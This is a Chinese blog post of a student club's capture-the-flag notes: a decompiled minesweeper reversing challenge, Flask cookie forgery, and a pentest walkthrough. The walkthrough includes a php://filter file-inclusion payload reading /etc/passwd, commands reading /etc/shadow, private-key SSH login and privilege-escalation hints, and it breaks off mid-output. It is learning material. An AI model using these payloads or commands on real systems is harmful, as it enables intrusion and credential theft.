@@ -1,0 +1,434 @@
+<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta name="description" content="dvctf                           reverse                           mine game">
+<meta property="og:type" content="article">
+<meta property="og:title" content="3.18 协会活动">
+<meta property="og:url" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/index.html">
+<meta property="og:site_name" content="Clutter Box">
+<meta property="og:description" content="dvctf                           reverse                           mine game">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220318194622181.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220318211945717.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220318230629988.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320194227516.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320194832180.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320194908075.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320201041726.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320201854068.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320201948988.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220323133812614.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320202639014.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320202725949.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320204625886.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320211403759.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320211557901.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220322235946824.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320230637588.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320233941101.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321124517422.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321124557997.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321125150399.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321130440036.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321130800238.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321133831852.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321145927532.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321153129211.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220321155740611.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220322003126252.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220323125208011.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220323130628608.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220323131201964.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220323132438364.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220323132756324.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220323134207867.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220324105652419.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220325204153453.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220325204244366.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220325204322882.png">
+<meta property="og:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/WEB839b9c3714ade2eb01f0d039961f4399-16482129494003">
+<meta property="article:published_time" content="2022-03-18T11:23:02.000Z">
+<meta property="article:modified_time" content="2022-07-15T02:34:00.467Z">
+<meta property="article:author" content="Kirsten Carton">
+<meta property="article:tag" content="pentest">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220318194622181.png"><title>3.18 协会活动 | Clutter Box</title><link ref="canonical" href="http://example.com/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"Copy","copySuccess":"Copy Success","copyError":"Copy Error"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.0.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">Home</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">Archives</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">Categories</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">Tags</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Clutter Box</div><div class="header-banner-info__subtitle"></div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content" id="content"><!-- Just used to judge whether it is an article page--><div id="is-post"></div><div class="post"><header class="post-header"><h1 class="post-title">3.18 协会活动</h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">Created</span><span class="post-meta-item__value">2022-03-18</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">Updated</span><span class="post-meta-item__value">2022-07-15</span></span></div></header><div class="post-body">
+        <h1 id="dvctf">
+          <a href="#dvctf" class="heading-link"><i class="undefined"></i></a><a href="#dvctf" class="headerlink" title="dvctf"></a>dvctf</h1>
+      
+        <h2 id="reverse">
+          <a href="#reverse" class="heading-link"><i class="undefined"></i></a><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h2>
+      
+        <h3 id="mine-game">
+          <a href="#mine-game" class="heading-link"><i class="undefined"></i></a><a href="#mine-game" class="headerlink" title="mine game"></a>mine game</h3>
+      <span id="more"></span>
+
+<p>[]&#x4E2D;&#x653E;&#x4E00;&#x4E2A;&#x5750;&#x6807; &#x4E00;&#x7EF4;&#x53D8;&#x4E8C;&#x7EF4;&#xFF1F;</p>
+<p>&#x672C;&#x8D28;&#x662F;&#x626B;&#x96F7;  *&#x662F;&#x96F7;&#x5BF9;&#x5E94;42   -&#x5BF9;&#x5E94;45</p>
+<p>strtok</p>
+<p>strtok&#xFF08;0LL,;&#xFF09;</p>
+<p>srand()&#x968F;&#x673A;&#x6570;&#x79CD;&#x5B50;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">__int64 sub_127A()</span><br><span class="line">{</span><br><span class="line">  __int64 result; // rax</span><br><span class="line">  int v1; // [rsp+8h] [rbp-8h]</span><br><span class="line">  int i; // [rsp+8h] [rbp-8h]</span><br><span class="line">  int v3; // [rsp+Ch] [rbp-4h]</span><br><span class="line">  int j; // [rsp+Ch] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  srand(0x29Au);</span><br><span class="line">  dword_40E0 = 0;</span><br><span class="line">  while ( dword_40E0 &lt; dword_40A0 )</span><br><span class="line">  {</span><br><span class="line">    v3 = rand() % dword_4098;</span><br><span class="line">    v1 = rand() % dword_409C;</span><br><span class="line">    if ( dword_4100[14 * v3 + v1] != 42 )</span><br><span class="line">    {</span><br><span class="line">      dword_4100[14 * v3 + v1] = 42;</span><br><span class="line">      ++dword_40E0;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  for ( i = 0; ; ++i )</span><br><span class="line">  {</span><br><span class="line">    result = (unsigned int)dword_409C;</span><br><span class="line">    if ( i &gt;= dword_409C )</span><br><span class="line">      break;</span><br><span class="line">    for ( j = 0; j &lt; dword_4098; ++j )</span><br><span class="line">    {</span><br><span class="line">      if ( dword_4100[14 * j + i] != 42 )</span><br><span class="line">      {</span><br><span class="line">        dword_4100[14 * j + i] = 0;</span><br><span class="line">        if ( dword_4100[14 * j - 15 + i] == 42 )</span><br><span class="line">          ++dword_4100[14 * j + i];</span><br><span class="line">        if ( dword_4100[14 * j - 14 + i] == 42 )</span><br><span class="line">          ++dword_4100[14 * j + i];</span><br><span class="line">        if ( dword_4100[14 * j - 1 + i] == 42 )</span><br><span class="line">          ++dword_4100[14 * j + i];</span><br><span class="line">        if ( dword_4100[14 * j - 13 + i] == 42 )</span><br><span class="line">          ++dword_4100[14 * j + i];</span><br><span class="line">        if ( dword_4100[14 * j + 13 + i] == 42 )</span><br><span class="line">          ++dword_4100[14 * j + i];</span><br><span class="line">        if ( dword_4100[14 * j + 14 + i] == 42 )</span><br><span class="line">          ++dword_4100[14 * j + i];</span><br><span class="line">        if ( dword_4100[14 * j + 1 + i] == 42 )</span><br><span class="line">          ++dword_4100[14 * j + i];</span><br><span class="line">        if ( dword_4100[14 * j + 15 + i] == 42 )</span><br><span class="line">          ++dword_4100[14 * j + i];</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  return result;</span><br><span class="line">}</span><br></pre></td></tr></table></div></figure>
+
+<p>[14 * v3 + v1]&#x662F;&#x7528;&#x4E00;&#x7EF4;&#x8868;&#x793A;&#x4E8C;&#x7EF4;&#xFF0C;j,i&#x8868;&#x793A;&#x6A2A;&#x5750;&#x6807;&#xFF0C;&#x7EB5;&#x5750;&#x6807;&#x3002;</p>
+<p><strong>0  //int<br>0L  //long<br>0LL //long long<br>0UL //unsigned long<br>0.0 //double<br>0.0f //float<br>0.0L //long double</strong></p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220318194622181.png" alt="image-20220318194622181" style="zoom:33%;">
+
+<p>sub_127A&#x7C7B;&#x578B;&#x662F;&#x4E2A;&#x51FD;&#x6570;</p>
+
+        <h2 id="web">
+          <a href="#web" class="heading-link"><i class="undefined"></i></a><a href="#web" class="headerlink" title="web"></a>web</h2>
+      <p>flask &#x662F;&#x4E2A;&#x6A21;&#x5757;</p>
+<p>&#x9664;&#x96F6;&#x5F02;&#x5E38;</p>
+<p>pin&#x7801; debugger&#x6A21;&#x5F0F;&#x4E0B; &#x5F00;&#x542F;Python&#x7684;&#x547D;&#x4EE4;&#x884C;</p>
+<p>wappalyzer</p>
+<p>&#x544A;&#x8BC9;&#x8BFB;&#x8005;&#x524D;&#x540E;&#x7AEF;&#x7528;&#x7684;&#x6846;&#x67B6;&#xFF0C;&#x8BED;&#x8A00;&#x7B49;</p>
+<p>cookie&#x91CC;&#x6709;&#x6821;&#x9A8C;base64&#x578B;</p>
+<p>secret_key</p>
+<p>flask&#xFF0C;cookie&#xFF0C;session&#x3001;</p>
+<p>&#x4F2A;&#x9020;&#x7BA1;&#x7406;&#x5458;&#x7684;cookie</p>
+<p>&#x5728;hackbar &#x7684;cookie&#x91CC;&#x6539;</p>
+
+        <h2 id="&#x6E17;&#x900F;">
+          <a href="#&#x6E17;&#x900F;" class="heading-link"><i class="undefined"></i></a><a href="#&#x6E17;&#x900F;" class="headerlink" title="&#x6E17;&#x900F;"></a>&#x6E17;&#x900F;</h2>
+      <p>&#x670D;&#x52A1;&#xFF1A;web ssh</p>
+<p>&#x5728;&#x767E;&#x5EA6;&#x4E0A;&#x641C;&#x7D22;ssh&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x540E;&#x6765;&#x53D1;&#x73B0;&#x811A;&#x672C;&#x90FD;&#x4E0D;&#x5BF9;</p>
+<p>&#x7136;&#x540E;&#x67E5;&#x770B;web&#x76F8;&#x5173;&#x7684;&#x6F0F;&#x6D1E;</p>
+<p>cat /etc/passwd</p>
+<p>passwd&#x65E0;&#x5BC6;&#x7801;&#xFF0C;shadow&#x91CC;&#x624D;&#x6709;&#xFF0C;&#x524D;&#x6709;&#x7528;&#x6237;&#x7684;&#x7EC4;&#x548C;&#x9ED8;&#x8BA4;&#x7684;&#x7EC8;&#x7AEF;</p>
+<p>php filter &#x5C06;&#x4EE3;&#x7801;&#x8F6C;&#x6362;&#x6210;base64&#x653E;&#x5230;&#x4E00;&#x884C;&#x91CC;&#x9762; top&#x662F;&#x884C;&#x6570;</p>
+<p>&#x8BFB;&#x6587;&#x4EF6;&#x62FF;&#x5230;&#x7BA1;&#x7406;&#x5458;&#x6743;&#x9650;&#xFF0C;&#x5FAE;&#x4FE1;&#x516C;&#x4F17;&#x53F7;</p>
+<p>&#x7528;&#x79C1;&#x94A5;&#x8FDE;&#x63A5;&#x670D;&#x52A1;&#x5668; -i&#x6307;&#x5B9A;&#x79C1;&#x94A5;&#x6587;&#x4EF6;&#xFF0C;&#x9700;&#x8981;&#x5728;URL&#x540E;&#x9762;&#x52A0; -p&#x518D;&#x52A0;&#x7AEF;&#x53E3;</p>
+<p>&#x6B64;&#x65F6;&#x6743;&#x9650;&#x8F83;&#x4F4E;&#xFF0C;&#x9700;&#x8981;&#x63D0;&#x6743;</p>
+<p>suid &#x63D0;&#x6743;&#x7B49;&#x65B9;&#x6CD5;&#xFF0C;&#x6709;&#x5DE5;&#x5177;</p>
+<p>cat /etc/shadow &#x6743;&#x9650;&#x4E0D;&#x591F;</p>
+<p>sudo cat /etc/shadow </p>
+<p>su&#x2014;&#x2014;superuser</p>
+<p>su&#x6743;&#x9650;&#x8F83;&#x9AD8;</p>
+<p>&#x6307;&#x5411;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x5BC6;&#x7801;</p>
+<p>sudo diff&#x5BF9;&#x6BD4;&#x4E24;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#x6709;&#x4EC0;&#x4E48;&#x4E0D;&#x4E00;&#x6837;&#x7684;</p>
+<p>Linux&#x4E0B;&#x67E5;&#x770B;&#x7528;&#x6237;&#x540D;&#x53CA;&#x5BC6;&#x7801;</p>
+<p>&#x8FD9;&#x9053;&#x9898;&#x91CC;&#x6D89;&#x53CA;&#x4E86;md5&#x6587;&#x4EF6;</p>
+<p>cmd5</p>
+<p>&#x53EF;&#x4EE5;&#x5728;Linux&#x4E2D;&#x770B;&#x7248;&#x672C;&#x53F7;&#xFF0C;&#x901A;&#x8FC7;&#x8FD9;&#x4E2A;&#x4E0A;&#x7F51;&#x641C;&#x67E5;&#x770B;&#x6709;&#x4EC0;&#x4E48;&#x63D0;&#x6743;&#x6F0F;&#x6D1E;  &#xFF08;dirty pipe&#xFF09;&#x6F0F;&#x6D1E;  &#x53EF;&#x4EE5;&#x4E0A;&#x7F51;&#x770B;&#x590D;&#x73B0;</p>
+
+        <h2 id="web-music">
+          <a href="#web-music" class="heading-link"><i class="undefined"></i></a><a href="#web-music" class="headerlink" title="web music"></a>web music</h2>
+      <p>symfony&#x8FD9;&#x4E2A;&#x6846;&#x67B6;&#x7684;&#x5B89;&#x5168;&#x95EE;&#x9898; &#x548C;secret-key&#x6709;&#x5173;</p>
+<p>app -secret &#x66B4;&#x9732;&#x4E86;key</p>
+
+        <h1 id="&#x590D;&#x73B0;&#x7ECF;&#x5386;">
+          <a href="#&#x590D;&#x73B0;&#x7ECF;&#x5386;" class="heading-link"><i class="undefined"></i></a><a href="#&#x590D;&#x73B0;&#x7ECF;&#x5386;" class="headerlink" title="&#x590D;&#x73B0;&#x7ECF;&#x5386;"></a>&#x590D;&#x73B0;&#x7ECF;&#x5386;</h1>
+      
+        <h2 id="pentest-part1">
+          <a href="#pentest-part1" class="heading-link"><i class="undefined"></i></a><a href="#pentest-part1" class="headerlink" title="pentest part1"></a>pentest part1</h2>
+      <p>&#x7B2C;&#x4E00;&#x9053;pentest&#x9898;</p>
+<p>&#x9996;&#x5148;&#x6253;&#x5F00;nmap&#x626B;&#x63CF;</p>
+<p>&#xFF08;&#x626B;&#x63CF;&#x4E2D;&#xFF09;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220318211945717.png" alt="image-20220318211945717" style="zoom:50%;">
+
+<p>&#x540E;&#x53D1;&#x73B0;ssh&#x4E0E;web&#x4E24;&#x4E2A;&#x670D;&#x52A1;&#xFF0C;&#x5728;&#x7F51;&#x4E0A;&#x641C;cve</p>
+<p><strong>CVE &#x662F;&#x901A;&#x7528;&#x6F0F;&#x6D1E;&#x62AB;&#x9732;&#xFF08;Common Vulnerabilities and Exposures&#xFF09;&#x7684;&#x82F1;&#x6587;&#x7F29;&#x5199;</strong></p>
+<p>&#x6CA1;&#x6709;&#x76F8;&#x540C;&#x7684;cve</p>
+<p>&#x7136;&#x540E;&#x4ECE;web&#x5165;&#x624B;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?mytop5=1&amp;playlisttop=/etc/passwd    //&#x8FD9;&#x662F;&#x4E00;&#x6BB5;&#x6D4B;&#x8BD5;&#x7528;&#x7684;&#x4EE3;&#x7801;</span><br><span class="line">view-source:challs.dvc.tf:51080/?MyTop5=1&amp;playlistTop=php://filter/convert.base64-</span><br><span class="line">encode/resource=/etc/passwd</span><br></pre></td></tr></table></div></figure>
+
+<p>**1&#x914D;&#x5408;phpfilter&#x53EF;&#x4EE5;&#x4E00;&#x6B21;&#x8BFB;&#x53D6;&#x51FA;&#x5168;&#x90E8;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9; **</p>
+<p><strong>2&#x8BFB;&#x51FA;&#x4EE3;&#x7801;,&#x53D1;&#x73B0;&#x65E0;&#x53EF;&#x5229;&#x7528;&#x70B9;</strong></p>
+<p><strong>3&#x8BFB;/etc/passwd, &#x6536;&#x96C6;&#x76EE;&#x6807;&#x4E3B;&#x673A;&#x7684;&#x7528;&#x6237;</strong>&#xFF08;&#x5B66;&#x957F;&#x7684;wp&#x662F;&#x8FD9;&#x6837;&#x5199;&#x7684;&#xFF09;</p>
+<p><font color="red">/etc/passwd&#x6587;&#x4EF6;&#xFF1A;&#x7CFB;&#x7EDF;&#x7528;&#x6237;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x5B58;&#x50A8;&#x4E86;&#x7CFB;&#x7EDF;&#x4E2D;&#x6240;&#x6709;&#x7528;&#x6237;&#x7684;&#x57FA;&#x672C;&#x4FE1;&#x606F;&#xFF0C;&#x5E76;&#x4E14;&#x6240;&#x6709;&#x7528;&#x6237;&#x90FD;&#x53EF;&#x4EE5;&#x5BF9;&#x6B64;&#x6587;&#x4EF6;&#x6267;&#x884C;&#x8BFB;(r)&#x64CD;&#x4F5C;&#x3002;</font></p>
+<p>&#x901A;&#x8FC7;&#x6784;&#x9020;passwd&#x8FD9;&#x4E2A;Linux&#x7684;&#x6307;&#x4EE4;&#x6765;&#x67E5;&#x770B;&#x6F0F;&#x6D1E;</p>
+<p><img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220318230629988.png" alt="image-20220318230629988"></p>
+<p>&#x6709;&#x8FD9;&#x4E00;&#x4E32;&#xFF1A;</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sha384-ekOryaXPbeCpWQNxMwSWVvQ0+1VrStoPJq54shlYhR8HzQgig1v5fas6YgOqLoKz</span><br></pre></td></tr></table></div></figure>
+
+
+
+<p>&#x8FD9;&#x662F;&#x7528;&#x6237;&#x7684;&#x52A0;&#x5BC6;&#x540E;&#x7684;cookie&#xFF0C;&#x52A0;&#x53F7;&#x540E;&#x9762;&#x90A3;&#x4E00;&#x4E32;&#x662F;base64&#x52A0;&#x5BC6;&#xFF0C;&#x9632;&#x6B62;&#x4F1A;&#x5176;&#x4ED6;&#x4EBA;&#x4FEE;&#x6539;&#x7528;&#x6237;</p>
+<p>&#x7ED9;&#x51FA;&#x7684;wp&#x4E0A;&#x5199;<strong>&#x7B2C;&#x4E00;&#x4E2A;&#x53C2;&#x6570;&#x63A7;&#x5236;&#x884C;,&#x7B2C;&#x4E8C;&#x4E2A;&#x53C2;&#x6570;&#x4E3A;&#x6587;&#x4EF6;&#x540D;</strong>  MyTop5&#x53C2;&#x6570;&#x662F;&#x63A7;&#x5236;&#x8BFB;&#x7684;&#x884C;&#x7684;&#x6570;&#x636E;</p>
+<p>&#x5C31;&#x6682;&#x4E14;&#x8FD9;&#x4E48;&#x7406;&#x89E3;&#x5427;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320194227516.png" alt="image-20220320194227516" style="zoom:50%;">
+
+<p>&#x8BFB;&#x53D6;&#x7528;&#x6237;&#x7684;&#x4E3B;&#x673A;&#x540D;</p>
+<p>&#x5176;&#x5B9E;&#x6784;&#x9020;&#x540E;</p>
+<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320194832180.png" alt="image-20220320194832180" style="zoom:50%;">
+
+<p>&#x51FA;&#x73B0;<img src="/2022/03/18/3-18-%E5%8D%8F%E4%BC%9A%E6%B4%BB%E5%8A%A8/image-20220320194908075.png" alt="image-20220320194908075" style="zoom:33%;"></p>
+<p>&#x4E4B;&#x540E;&#x4F3C;&#x4E4E;&#x662F;base64&#x89E3;&#x7801;&#xFF1B;</p>
+<p>&#x8FD9;&#x91CC;&#x7684;&#x5F88;&#x957F;&#x4E00;&#x4E32;base64&#x5176;&#x5B9E;&#x662F;&#x5C06;&#x6587;&#x4EF6;&#x7528;base64&#x7684;&#x5F62;&#x5F0F;&#x8868;&#x793A;&#x51FA;&#x6765;&#xFF0C;(&#x5FD8;&#x4E86;&#x5177;&#x4F53;&#x7684;&#x8FD9;&#x79CD;&#x65B9;&#x6CD5;&#x7684;&#x540D;&#x79F0;&#x53EB;&#x4EC0;&#x4E48;&#x4E86;)</p>
+<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">//&#x89E3;&#x7801;&#x540E;&#x5F97;&#x5230;&#x4E0B;&#x9762;&#x4E00;&#x4E32;</span><br><span class="line">root:x:0:0:root:/root:/bin/zsh</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span 